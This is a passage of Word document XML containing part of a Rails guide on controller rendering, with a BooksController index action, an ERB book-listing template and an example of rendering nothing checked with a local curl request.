    </w:p>
    <w:p w14:paraId="3F1FCBD7" w14:textId="77777777" w:rsidR="00AC12D4" w:rsidRDefault="00AC12D4" w:rsidP="00AC12D4">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">However a coming soon screen is only minimally useful, so you will soon create your </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>Book</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> model and add the index action to </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>BooksController</w:t>
      </w:r>
      <w:r>
        <w:t>:</w:t>
      </w:r>
    </w:p>
    <w:tbl>
      <w:tblPr>
        <w:tblW w:w="0" w:type="auto"/>
        <w:tblCellSpacing w:w="0" w:type="dxa"/>
        <w:tblCellMar>
          <w:left w:w="0" w:type="dxa"/>
          <w:right w:w="0" w:type="dxa"/>
        </w:tblCellMar>
        <w:tblLook w:val="04A0" w:firstRow="1" w:lastRow="0" w:firstColumn="1" w:lastColumn="0" w:noHBand="0" w:noVBand="1"/>
      </w:tblPr>
      <w:tblGrid>
        <w:gridCol w:w="5328"/>
      </w:tblGrid>
      <w:tr w:rsidR="00AC12D4" w14:paraId="7B846F1F" w14:textId="77777777" w:rsidTr="00AC12D4">
        <w:trPr>
          <w:tblCellSpacing w:w="0" w:type="dxa"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="41DBBF43" w14:textId="77777777" w:rsidR="00AC12D4" w:rsidRDefault="00AC12D4" w:rsidP="00AC12D4">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>class</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>BooksController &lt; ApplicationController</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="2645441C" w14:textId="77777777" w:rsidR="00AC12D4" w:rsidRDefault="00AC12D4" w:rsidP="00AC12D4">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>  def</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>index</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="4A52A6AF" w14:textId="77777777" w:rsidR="00AC12D4" w:rsidRDefault="00AC12D4" w:rsidP="00AC12D4">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>    @books</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>= Book.all</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="5FD17079" w14:textId="77777777" w:rsidR="00AC12D4" w:rsidRDefault="00AC12D4" w:rsidP="00AC12D4">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>  end</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="00D4B730" w14:textId="77777777" w:rsidR="00AC12D4" w:rsidRDefault="00AC12D4" w:rsidP="00AC12D4">
            <w:pPr>
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>end</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w14:paraId="22A7EB6E" w14:textId="77777777" w:rsidR="00AC12D4" w:rsidRDefault="00AC12D4" w:rsidP="00AC12D4">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">Note that we don’t have explicit render at the end of the index action in accordance with “convention over configuration” principle. The rule is that if you do not explicitly render something at the end of a controller action, Rails will automatically look for the </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>action_name.html.erb</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> template in the controller’s view path and render it. So in this case, Rails will render the </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>app/views/books/index.html.erb</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> file.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1EFFA105" w14:textId="77777777" w:rsidR="00AC12D4" w:rsidRDefault="00AC12D4" w:rsidP="00AC12D4">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">If we want to display the properties of all the books in our view, we can do so with an </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="caps"/>
        </w:rPr>
        <w:t>ERB</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> template like this:</w:t>
      </w:r>
    </w:p>
    <w:tbl>
      <w:tblPr>
        <w:tblW w:w="0" w:type="auto"/>
        <w:tblCellSpacing w:w="0" w:type="dxa"/>
        <w:tblCellMar>
          <w:left w:w="0" w:type="dxa"/>
          <w:right w:w="0" w:type="dxa"/>
        </w:tblCellMar>
        <w:tblLook w:val="04A0" w:firstRow="1" w:lastRow="0" w:firstColumn="1" w:lastColumn="0" w:noHBand="0" w:noVBand="1"/>
      </w:tblPr>
      <w:tblGrid>
        <w:gridCol w:w="8306"/>
      </w:tblGrid>
      <w:tr w:rsidR="00AC12D4" w14:paraId="7EF01F86" w14:textId="77777777" w:rsidTr="00AC12D4">
        <w:trPr>
          <w:tblCellSpacing w:w="0" w:type="dxa"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="4FD11049" w14:textId="77777777" w:rsidR="00AC12D4" w:rsidRDefault="00AC12D4" w:rsidP="00AC12D4">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>&lt;h1&gt;Listing Books&lt;/h1&gt;</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="226AA7B3" w14:textId="77777777" w:rsidR="00AC12D4" w:rsidRDefault="00AC12D4" w:rsidP="00AC12D4">
            <w:r>
              <w:t> </w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="70B03612" w14:textId="77777777" w:rsidR="00AC12D4" w:rsidRDefault="00AC12D4" w:rsidP="00AC12D4">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>&lt;table&gt;</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="33174BA6" w14:textId="77777777" w:rsidR="00AC12D4" w:rsidRDefault="00AC12D4" w:rsidP="00AC12D4">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>  &lt;tr&gt;</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="1FBDE391" w14:textId="77777777" w:rsidR="00AC12D4" w:rsidRDefault="00AC12D4" w:rsidP="00AC12D4">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>    &lt;th&gt;Title&lt;/th&gt;</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="52CFF75C" w14:textId="77777777" w:rsidR="00AC12D4" w:rsidRDefault="00AC12D4" w:rsidP="00AC12D4">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>    &lt;th&gt;Summary&lt;/th&gt;</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="0F515B6B" w14:textId="77777777" w:rsidR="00AC12D4" w:rsidRDefault="00AC12D4" w:rsidP="00AC12D4">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>    &lt;th&gt;&lt;/th&gt;</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="3F2CC6ED" w14:textId="77777777" w:rsidR="00AC12D4" w:rsidRDefault="00AC12D4" w:rsidP="00AC12D4">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>    &lt;th&gt;&lt;/th&gt;</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="33D84EA3" w14:textId="77777777" w:rsidR="00AC12D4" w:rsidRDefault="00AC12D4" w:rsidP="00AC12D4">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>    &lt;th&gt;&lt;/th&gt;</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="0C4D8335" w14:textId="77777777" w:rsidR="00AC12D4" w:rsidRDefault="00AC12D4" w:rsidP="00AC12D4">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>  &lt;/tr&gt;</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="14AF4061" w14:textId="77777777" w:rsidR="00AC12D4" w:rsidRDefault="00AC12D4" w:rsidP="00AC12D4">
            <w:r>
              <w:t> </w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="22457E97" w14:textId="77777777" w:rsidR="00AC12D4" w:rsidRDefault="00AC12D4" w:rsidP="00AC12D4">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>&lt;% @books.each</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>do</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>|book| %&gt;</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="5F1626EB" w14:textId="77777777" w:rsidR="00AC12D4" w:rsidRDefault="00AC12D4" w:rsidP="00AC12D4">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>  &lt;tr&gt;</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="6FDFEAD2" w14:textId="77777777" w:rsidR="00AC12D4" w:rsidRDefault="00AC12D4" w:rsidP="00AC12D4">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>    &lt;td&gt;&lt;%= book.title %&gt;&lt;/td&gt;</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="7C40783D" w14:textId="77777777" w:rsidR="00AC12D4" w:rsidRDefault="00AC12D4" w:rsidP="00AC12D4">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>    &lt;td&gt;&lt;%= book.content %&gt;&lt;/td&gt;</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="5051C966" w14:textId="77777777" w:rsidR="00AC12D4" w:rsidRDefault="00AC12D4" w:rsidP="00AC12D4">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>    &lt;td&gt;&lt;%= link_to 'Show', book %&gt;&lt;/td&gt;</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="6CA83707" w14:textId="77777777" w:rsidR="00AC12D4" w:rsidRDefault="00AC12D4" w:rsidP="00AC12D4">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>    &lt;td&gt;&lt;%= link_to 'Edit', edit_book_path(book) %&gt;&lt;/td&gt;</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="0C53F3BE" w14:textId="77777777" w:rsidR="00AC12D4" w:rsidRDefault="00AC12D4" w:rsidP="00AC12D4">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>    &lt;td&gt;&lt;%= link_to 'Remove', book, :confirm</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>=&gt; 'Are you sure?', :method</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>=&gt; :delete</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>%&gt;&lt;/td&gt;</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="0BBA7E98" w14:textId="77777777" w:rsidR="00AC12D4" w:rsidRDefault="00AC12D4" w:rsidP="00AC12D4">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>  &lt;/tr&gt;</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="0C973409" w14:textId="77777777" w:rsidR="00AC12D4" w:rsidRDefault="00AC12D4" w:rsidP="00AC12D4">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>&lt;% end</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>%&gt;</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="1FB3F432" w14:textId="77777777" w:rsidR="00AC12D4" w:rsidRDefault="00AC12D4" w:rsidP="00AC12D4">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>&lt;/table&gt;</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="55ABDB1C" w14:textId="77777777" w:rsidR="00AC12D4" w:rsidRDefault="00AC12D4" w:rsidP="00AC12D4">
            <w:r>
              <w:t> </w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="3D019CCF" w14:textId="77777777" w:rsidR="00AC12D4" w:rsidRDefault="00AC12D4" w:rsidP="00AC12D4">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>&lt;br /&gt;</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="01E990A9" w14:textId="77777777" w:rsidR="00AC12D4" w:rsidRDefault="00AC12D4" w:rsidP="00AC12D4">
            <w:r>
              <w:t> </w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="785F669A" w14:textId="77777777" w:rsidR="00AC12D4" w:rsidRDefault="00AC12D4" w:rsidP="00AC12D4">
            <w:pPr>
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>&lt;%= link_to 'New book', new_book_path %&gt;</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w14:paraId="5CF65914" w14:textId="77777777" w:rsidR="00AC12D4" w:rsidRDefault="00AC12D4" w:rsidP="00AC12D4">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">The actual rendering is done by subclasses of </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>ActionView::TemplateHandlers</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">. This guide does not dig into that process, but it’s important to know that the file extension on your view controls the choice of template handler. Beginning with Rails 2, the standard extensions are </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>.erb</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> for </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="caps"/>
        </w:rPr>
        <w:t>ERB</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> (</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="caps"/>
        </w:rPr>
        <w:t>HTML</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> with embedded Ruby), and </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>.builder</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> for Builder (</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="caps"/>
        </w:rPr>
        <w:t>XML</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> generator).</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="71C448C7" w14:textId="77777777" w:rsidR="00AC12D4" w:rsidRDefault="00AC12D4" w:rsidP="00AC12D4">
      <w:pPr>
        <w:pStyle w:val="4"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">2.2 Using </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>render</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1228E572" w14:textId="77777777" w:rsidR="00AC12D4" w:rsidRDefault="00AC12D4" w:rsidP="00AC12D4">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">In most cases, the </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>ActionController::Base#render</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> method does the heavy lifting of rendering your application’s content for use by a browser. There are a variety of ways to customize the behaviour of </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>render</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">. You can render the default view for a Rails template, or a specific template, or a file, or inline code, or nothing at all. You can render text, </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="caps"/>
        </w:rPr>
        <w:t>JSON</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">, or </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="caps"/>
        </w:rPr>
        <w:t>XML</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">. You can specify the content type or </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="caps"/>
        </w:rPr>
        <w:t>HTTP</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> status of the rendered response as well.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="45F6F04D" w14:textId="77777777" w:rsidR="00AC12D4" w:rsidRDefault="00AC12D4" w:rsidP="00AC12D4">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">If you want to see the exact results of a call to </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>render</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> without needing to inspect it in a browser, you can call </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>render_to_string</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">. This method takes exactly the same options as </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>render</w:t>
      </w:r>
      <w:r>
        <w:t>, but it returns a string instead of sending a response back to the browser.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2D6D820E" w14:textId="77777777" w:rsidR="00AC12D4" w:rsidRDefault="00AC12D4" w:rsidP="00AC12D4">
      <w:pPr>
        <w:pStyle w:val="5"/>
      </w:pPr>
      <w:r>
        <w:t>2.2.1 Rendering Nothing</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5D2322E2" w14:textId="77777777" w:rsidR="00AC12D4" w:rsidRDefault="00AC12D4" w:rsidP="00AC12D4">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">Perhaps the simplest thing you can do with </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>render</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> is to render nothing at all:</w:t>
      </w:r>
    </w:p>
    <w:tbl>
      <w:tblPr>
        <w:tblW w:w="0" w:type="auto"/>
        <w:tblCellSpacing w:w="0" w:type="dxa"/>
        <w:tblCellMar>
          <w:left w:w="0" w:type="dxa"/>
          <w:right w:w="0" w:type="dxa"/>
        </w:tblCellMar>
        <w:tblLook w:val="04A0" w:firstRow="1" w:lastRow="0" w:firstColumn="1" w:lastColumn="0" w:noHBand="0" w:noVBand="1"/>
      </w:tblPr>
      <w:tblGrid>
        <w:gridCol w:w="2688"/>
      </w:tblGrid>
      <w:tr w:rsidR="00AC12D4" w14:paraId="5B955E9B" w14:textId="77777777" w:rsidTr="00AC12D4">
        <w:trPr>
          <w:tblCellSpacing w:w="0" w:type="dxa"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="27FE231A" w14:textId="77777777" w:rsidR="00AC12D4" w:rsidRDefault="00AC12D4">
            <w:pPr>
              <w:divId w:val="187523962"/>
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>render :nothing</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>=&gt; true</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w14:paraId="0C5B4910" w14:textId="77777777" w:rsidR="00AC12D4" w:rsidRDefault="00AC12D4" w:rsidP="00AC12D4">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t>If you look at the response for this using cURL, you will see the following:</w:t>
      </w:r>
    </w:p>
    <w:tbl>
      <w:tblPr>
        <w:tblW w:w="0" w:type="auto"/>
        <w:tblCellSpacing w:w="0" w:type="dxa"/>
        <w:tblCellMar>
          <w:left w:w="0" w:type="dxa"/>
          <w:right w:w="0" w:type="dxa"/>
        </w:tblCellMar>
        <w:tblLook w:val="04A0" w:firstRow="1" w:lastRow="0" w:firstColumn="1" w:lastColumn="0" w:noHBand="0" w:noVBand="1"/>
      </w:tblPr>
      <w:tblGrid>
        <w:gridCol w:w="6480"/>
      </w:tblGrid>
      <w:tr w:rsidR="00AC12D4" w14:paraId="5E728614" w14:textId="77777777" w:rsidTr="00AC12D4">
        <w:trPr>
          <w:tblCellSpacing w:w="0" w:type="dxa"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="250E9BBE" w14:textId="77777777" w:rsidR="00AC12D4" w:rsidRDefault="00AC12D4" w:rsidP="00AC12D4">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>$ curl -i 127.0.0.1:3000/books</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="3C7992F4" w14:textId="77777777" w:rsidR="00AC12D4" w:rsidRDefault="00AC12D4" w:rsidP="00AC12D4">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>HTTP/1.1 200 OK</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="1F0766B2" w14:textId="77777777" w:rsidR="00AC12D4" w:rsidRDefault="00AC12D4" w:rsidP="00AC12D4">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>Connection: close</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="79FB7C26" w14:textId="77777777" w:rsidR="00AC12D4" w:rsidRDefault="00AC12D4" w:rsidP="00AC12D4">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>Date: Sun, 24 Jan 2010 09:25:18 GMT</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="3FD6B491" w14:textId="77777777" w:rsidR="00AC12D4" w:rsidRDefault="00AC12D4" w:rsidP="00AC12D4">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>Transfer-Encoding: chunked</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="2AD9F4C5" w14:textId="77777777" w:rsidR="00AC12D4" w:rsidRDefault="00AC12D4" w:rsidP="00AC12D4">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>Content-Type: */*; charset=utf-8</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="068FF818" w14:textId="77777777" w:rsidR="00AC12D4" w:rsidRDefault="00AC12D4" w:rsidP="00AC12D4">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>X-Runtime: 0.014297</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="5C2D71FB" w14:textId="77777777" w:rsidR="00AC12D4" w:rsidRDefault="00AC12D4" w:rsidP="00AC12D4">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>Set-Cookie: _blog_session=...snip...; path=/; HttpOnly</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="567A8C0A" w14:textId="77777777" w:rsidR="00AC12D4" w:rsidRDefault="00AC12D4" w:rsidP="00AC12D4">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>Cache-Control: no-cache</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="365B3E04" w14:textId="77777777" w:rsidR="00AC12D4" w:rsidRDefault="00AC12D4" w:rsidP="00AC12D4">
            <w:r>
              <w:t> </w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="6566E5E2" w14:textId="77777777" w:rsidR="00AC12D4" w:rsidRDefault="00AC12D4" w:rsidP="00AC12D4">
            <w:r>
              <w:t> </w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="378E056A" w14:textId="77777777" w:rsidR="00AC12D4" w:rsidRDefault="00AC12D4" w:rsidP="00AC12D4">
            <w:pPr>
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t> $</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w14:paraId="6A8E8D8C" w14:textId="77777777" w:rsidR="00AC12D4" w:rsidRDefault="00AC12D4" w:rsidP="00AC12D4">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">We see there is an empty response (no data after the </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>Cache-Control</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> line), but the request was successful because Rails has set the response to 200 OK. You can set the </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>:status</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> option on render to change this response. Rendering nothing can be useful for </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="caps"/>
        </w:rPr>
        <w:t>AJAX</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> requests where all you want to send back to the browser is an acknowledgment that the request was completed.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="79D91D5B" w14:textId="77777777" w:rsidR="00AC12D4" w:rsidRDefault="00AC12D4" w:rsidP="00AC12D4">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">You should probably be using the </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>head</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> method, discussed later in this guide, instead of </w:t>
      </w:r>
      <w:r>
        <w:rPr>
